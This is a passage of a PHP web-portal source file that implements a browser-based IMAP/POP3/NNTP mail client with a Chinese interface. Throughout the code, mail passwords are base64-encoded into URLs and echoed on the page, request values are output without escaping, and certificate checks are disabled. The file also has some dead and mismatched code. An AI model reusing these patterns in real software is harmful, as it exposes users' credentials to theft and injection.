window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = $mail_count;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = 0;
                elseif ($totalpage > $page)
                        $endid = floor($mail_count-$strpagesize*($page));
                elseif ($totalpage < $page){
                        $endid = floor($mail_count-$strpagesize*($page-1));
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
        </tr>
</table>
                <?php 
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">

                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center">标题</td>
                                <td align="center" width="25%">发件人</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                $i = 0;
                for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                
                        if ($debug == 1){
                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '东亚银行系统升级公告'));
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        if($j!=count($mail_subject)-1){
                                                $mailsubject = (strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text'])." - ";
                                        }       
                                        else{
                                                $mailsubject = $mailsubject.(strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text']);
                                        }
                                }
                        }
                        else{
                                $list = imap_headerinfo($mbox,$i,1024,1024);//发件人字符长度，主题字符长度
                                $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                //print_r($mail_subject);
                                //return;
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        //echo $mail_subject[$j]->charset;
                                        $mailsubject = $mailsubject.((strtolower($mail_subject[$j]->charset)!='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_subject[$j]->charset),"gb2312",$mail_subject[$j]->text):$mail_subject[$j]->text);
                                }       

                                $mail_from = imap_mime_header_decode($list->fetchfrom);
                                $mailfrom = "";
                                for($j=0;$j<count($mail_from);$j++){
                                        $mailfrom = $mailfrom.((strtolower($mail_from[$j]->charset)!=='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_from[$j]->charset),"gb2312",$mail_from[$j]->text):$mail_from[$j]->text);
                                }                               
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                <td align="center"><?php echo $mailfrom;?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                    if ($_SESSION["openshift"]["uname"] != "" && $_SESSION["openshift"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        if (trim(request("api")) == "openshift"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('domain.list')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                     }          
        
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="openshift">
                        <form action="<?php echo ScriptPath();?>?api=openshift&action=<?php echo encodeuri("domain.list");?>&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>


<?php 
function imap() {
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - IMAP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if (0){
        $debug = 1;
}
else{
        $debug = 0;
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "mailbox.list":
                if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
                                AlertBack("服务器名、用户名或密码为空！" , 1);
                                break;
                        }
                        else{
                                AlertBack("服务器名、用户名或密码为空！" , 2);
                                break;
                        }
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("imap");
}                        

                        $_SESSION["imap"]=array('server' => '', 'uname' => '', 'pwd' => '');                    
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim($_POST["server"]) != "" && trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("imap");
} 
                        $_SESSION["imap"]=array('server' => trim(request("server")), 'uname' => trim(request("uname")), 'pwd' => trim(request("pwd")));                 
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&pagesize=".encodeuri($pagesize)."&page=1&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["imap"]["server"] != "" && $_SESSION["imap"]["uname"] != "" && $_SESSION["imap"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["imap"]["server"])))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(base64_encode(trim($_SESSION["imap"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["imap"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&page=".encodeuri($page)."&pagesize=".encodeuri($pagesize)."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                elseif (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=imap&skin=".$skincolor."&server=&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }  
                
        if(trim(request("port"))=="143" && trim(request("servertype"))=="imap"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                if (function_exists('imap_open') && function_exists('imap_list')){
                                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                        $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                                }
                                else{
                                }
                        }                       
                }
                elseif(trim(request("port"))=="110" && trim(request("servertype"))=="pop3"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/pop3}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="993" && (trim(request("servertype"))=="imap" || trim(request("servertype"))=="pop3")){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/imap/ssl}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="995" && (trim(request("servertype"))=="imap" || trim(request("servertype"))=="pop3")){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/pop3/ssl/novalidate-cert}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                elseif(trim(request("port"))=="119" && trim(request("servertype"))=="nntp"){
                        if ($debug == 1){
                                $list = Array(
                                                0 => '{imap.126.com:143}INBOX',
                                                1 => '{imap.126.com:143}Drafts',
                                                2 => '{imap.126.com:143}Sent Items',
                                                3 => '{imap.126.com:143}Trash',
                                                4 => '{imap.126.com:143}Virus Items',
                                                5 => '{imap.126.com:143}&W8Z4AQ-',
                                                6 => '{imap.126.com:143}Junk E-mail',
                                                7 => '{imap.126.com:143}&ZTZO9nux-',
                                                8 => '{imap.126.com:143}Advertisement',
                                                9 => '{imap.126.com:143}x3193@x3193.cz.cc'
                                );
                        }
                        else{
                                $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."/nntp}", base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                                $list = imap_getmailboxes($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}", "*");
                        }                       
                }
                else{
                        AlertBack("暂时无法接入该类服务器！" , 2);
                        break;
                }

                print_r($list);
                return;
                if (is_array($list)) {
                        //foreach ($list as $val) {
                        //      print_r(mb_convert_encoding($val, "GB2312", "UTF7-IMAP") . "\r\n");//UTF-7格式:&ftyug-
                        //}

                        //foreach ($list as $key => $val) {
                        //      echo "($key) ";
                        //      //echo imap_utf7_decode($val->name) . ",";
                        //      echo mb_convert_encoding($val->name, "GB2312", "UTF7-IMAP") . ",";
                        //      echo "'" . mb_convert_encoding($val->delimiter, "GB2312", "UTF7-IMAP") . "',";
                        //      echo mb_convert_encoding($val->attributes, "GB2312", "UTF7-IMAP") . "\r\n";
                        //}     

                        //print_r($list);                       
                }       
                else {
                        AlertBack("邮箱列表输出失败！".imap_last_error() , 2);
                        break;
                }
                //return;
                $contents = $list;              
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = count($contents);
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":trim(request("mailbox"));?></td>
        </tr>
</table>
                <?php 
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="25%">文件夹</td>
                                <td align="center">容量 - 最新 - 未读</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        //echo $i;
                        if ($debug == 1){
                        }
                        else{
                                $status = imap_status($mbox, "{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".preg_replace("/{[^{}]+}(.*)/", "\$1", $list[$i]), SA_ALL);
                                //print_r($status);
                                //return;                       
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"));?>" /></td>
                                <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(preg_replace("/{[^{}]+}(.*)/", "\$1", $list[$i]))."'>".preg_replace("/{[^{}]+}(.*)/", "\$1", mb_convert_encoding($list[$i], "GB2312", "UTF7-IMAP"))."</a>";?></td>
                                <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "mail.list":
                if ($debug == 1){
                        $mail_count = 1000;
                }
                else{
                        //echo trim(request("mailbox"));
                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".trim(request("mailbox")), base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                        $mail_count = imap_num_msg($mbox);
                }
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
